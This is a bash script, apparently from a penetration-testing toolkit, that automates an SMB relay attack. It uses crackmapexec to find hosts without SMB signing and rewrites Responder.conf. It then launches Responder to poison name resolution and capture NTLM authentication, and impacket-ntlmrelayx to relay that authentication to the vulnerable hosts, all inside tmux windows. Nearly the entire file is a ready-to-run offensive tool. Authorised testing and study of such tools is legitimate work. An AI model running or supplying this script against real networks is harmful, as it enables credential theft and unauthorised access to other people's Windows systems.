#!/bin/bash

# =============================================================
# ntlmninja.sh - SMB Relay Attack Automation Script
# -------------------------------------------------------------
# This script automates the setup and execution of an SMB relay
# attack using tools like Responder, Impacket's ntlmrelayx,
# crackmapexec, and tmux. It scans a list of target IPs for
# misconfigured SMB signing, and if vulnerabilities are found,
# it initiates a relay attack within a tmux session.
#
# Author: Howell King Jr. | Github: https://github.com/sp3ttr0
# =============================================================

responder_config_file="/etc/responder/Responder.conf"
session_name="smb_relay_attack"
window1="responder"
window2="ntlmrelayx"
TARGET_SMB_FILE="vulnerable_smb_targets.txt" 

# Define color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Network interface (dynamically detected by default)
network_interface="$(ip route | awk '/default/ {print $5; exit}')"

# Log file
log_file="smb_relay_attack.log"
exec > >(tee -a "$log_file") 2>&1

# Print help
print_help() {
    echo -e "${BLUE}Usage: $0 [-f TARGET_FILE] [-i NETWORK_INTERFACE] [-h]${NC}"
    echo -e "  ${YELLOW}-f TARGET_FILE${NC}   File containing target IPs to scan for misconfigured SMB signing."
    echo -e "  ${YELLOW}-i NETWORK_INTERFACE${NC} Specify network interface (default: ${network_interface})."
    echo -e "  ${YELLOW}-h${NC}               Display this help and exit."
}

# Banner function
banner() {
  echo -e "${CYAN}"
  echo -e "                                                         "
  echo -e "    ▄     ▄▄▄▄▀ █    █▀▄▀█    ▄   ▄█    ▄    ▄▄▄▄▄ ██    "
  echo -e "     █ ▀▀▀ █    █    █ █ █     █  ██     █ ▄▀  █   █ █   "
  echo -e " ██   █    █    █    █ ▄ █ ██   █ ██ ██   █    █   █▄▄█  "
  echo -e " █ █  █   █     ███▄ █   █ █ █  █ ▐█ █ █  █ ▄ █    █  █  "
  echo -e " █  █ █  ▀          ▀   █  █  █ █  ▐ █  █ █  ▀        █  "
  echo -e " █   ██                ▀   █   ██    █   ██          █   "
  echo -e "                        by sp3ttro                       "
  echo -e "                                                         "
  echo -e "                                                         "
  echo -e "${RESET}"
}       

# Check if a tool is installed
check_tool() {
    echo -e "[*] Checking ${YELLOW}$1${NC} if installed..."
    command -v "$1" > /dev/null 2>&1 || {
        echo -e "${RED}[!] $1 is not installed. Please install it first. Exiting.${NC}"
        exit 1
    }
}

# Validate network interface
validate_network_interface() {
    if ! ip link show "$network_interface" > /dev/null 2>&1; then
        echo -e "${RED}[!] Network interface ${network_interface} not found. Exiting.${NC}"
        exit 1
    fi
}

# Run crackmapexec
run_crackmapexec() {
    echo -e "[*] ${BLUE}Scanning for misconfigured SMB signing on targets...${NC}"
    echo -e "[*] ${GREEN}Generating list of vulnerable targets in ${TARGET_SMB_FILE}.${NC}"
    
    # Run crackmapexec and let it generate the relay list
    crackmapexec smb "${TARGET_FILE}" --gen-relay-list "${TARGET_SMB_FILE}"

    # Optional: show which targets were found
    if [ -s "${TARGET_SMB_FILE}" ]; then
        echo -e "[+] ${YELLOW}Misconfigured SMB signing detected on the following targets:${NC}"
        cat "${TARGET_SMB_FILE}" | while read -r ip; do
            echo -e "${YELLOW}[!] $ip${NC}"
        done
    else
        echo -e "${RED}[!] No vulnerable targets found.${NC}"
    fi
}

# Edit Responder.conf file
edit_responder_conf() {
if [ -f "${responder_config_file}" ]; then
        if grep -qE '^SMB = Off$' "${responder_config_file}" && grep -qE '^HTTP = Off$' "${responder_config_file}"; then
            echo -e "[*] ${GREEN}Responder.conf already configured with SMB and HTTP set to 'Off'.${NC}"
        else
            echo -e "[*] ${YELLOW}Updating Responder.conf to turn off SMB and HTTP...${NC}"
            sudo sed -i 's/^SMB = .*/SMB = Off/' "${responder_config_file}"
            sudo sed -i 's/^HTTP = .*/HTTP = Off/' "${responder_config_file}"
            echo -e "[+] ${GREEN}Responder.conf updated successfully.${NC}"
        fi
    else
        echo -e "${RED}[!] Responder.conf file not found. Please ensure Responder is installed and configured properly.${NC}"
        exit 1
    fi
}

# Function to start or attach to a tmux session and initialize windows
start_tmux_window() {
    local session_name=$1
    local window_name=$2
    local command=$3
    
    # Create the window in the tmux session
    tmux new-window -t "$session_name" -n "$window_name"
    
    # Send the command to the new tmux window
    tmux send-keys -t "$session_name:$window_name" "$command" C-m
}

# Function to execute SMB relay attack in tmux
run_smb_relay_attack() {
    echo -e "[*] ${BLUE}Starting SMB Relay Attack...${NC}"

    # Ensure tmux session exists
    if ! tmux has-session -t "$session_name" 2>/dev/null; then
        echo -e "[+] ${GREEN}Creating tmux session: $session_name.${NC}"
        tmux new-session -d -s "$session_name"
    fi

    # Start Responder in a tmux window
    echo -e "${CYAN}Starting Responder on interface $network_interface...${RESET}"
    start_tmux_window "$session_name" "responder" "responder -I $network_interface" || {
        echo -e "${RED}Failed to start Responder.${RESET}"
        exit 1
    }

    # Start ntlmrelayx in another tmux window
    echo -e "${CYAN}Starting impacket-ntlmrelayx with target file ${TARGET_SMB_FILE}...${RESET}"
    start_tmux_window "$session_name" "ntlmrelayx" "impacket-ntlmrelayx -smb2support -tf ${TARGET_SMB_FILE}" || {
        echo -e "${RED}Failed to start ntlmrelayx.${RESET}"
        exit 1
    }

    # Attach to the tmux session
    tmux -CC attach-session -t "$session_name"
}

while getopts "f:hi:" opt; do
    case $opt in
    f)
        TARGET_FILE="$OPTARG"
        ;;
    h)
        print_help
        exit 0
        ;;
    i)
        network_interface="$OPTARG"
        ;;
    \?)
        echo -e "${RED}[!] Invalid option: -$OPTARG${NC}" >&2
        exit 1
        ;;
    :)
        echo -e "${RED}[!] Option -$OPTARG requires an argument.${NC}" >&2
        exit 1
        ;;
    esac
done

# Show the banner
banner

# Start SMB Relay Attack
if tmux has-session -t "$session_name" 2>/dev/null; then
    echo -e "${YELLOW}[!] Tmux session '${session_name}' already exists.${NC}"
    echo -e "${BLUE}Do you want to:${NC}"
    echo -e "  [a] Attach to existing session"
    echo -e "  [k] Kill existing session"
    read -rp "$(echo -e "${YELLOW}Choose [a/k]: ${NC}")" user_choice

    case "$user_choice" in
        [aA])
            echo -e "${GREEN}[*] Attaching to existing tmux session...${NC}"
            tmux -CC attach-session -t "$session_name"
            exit 0
            ;;
        [kK])
            echo -e "${RED}[*] Killing existing tmux session...${NC}"
            tmux kill-session -t "$session_name"
            ;;
        *)
            echo -e "${RED}[!] Invalid choice. Exiting.${NC}"
            exit 1
            ;;
    esac
fi

# Check required arguments
if [ -z "${TARGET_FILE}" ]; then
    echo -e "${RED}[!] Usage: ./$0 [-f TARGET_FILE] [-i NETWORK_INTERFACE]${NC}"
    exit 1
fi

validate_network_interface
# Check if required tools are installed
check_tool "tmux"
check_tool "responder"
check_tool "impacket-ntlmrelayx"
check_tool "crackmapexec"

run_crackmapexec

if [ -s "${TARGET_SMB_FILE}" ]; then
    edit_responder_conf
    sleep 2
    run_smb_relay_attack
else
    echo -e "${RED}[!] There are no misconfigured smb signing targets found. Exiting...${NC}"
fi
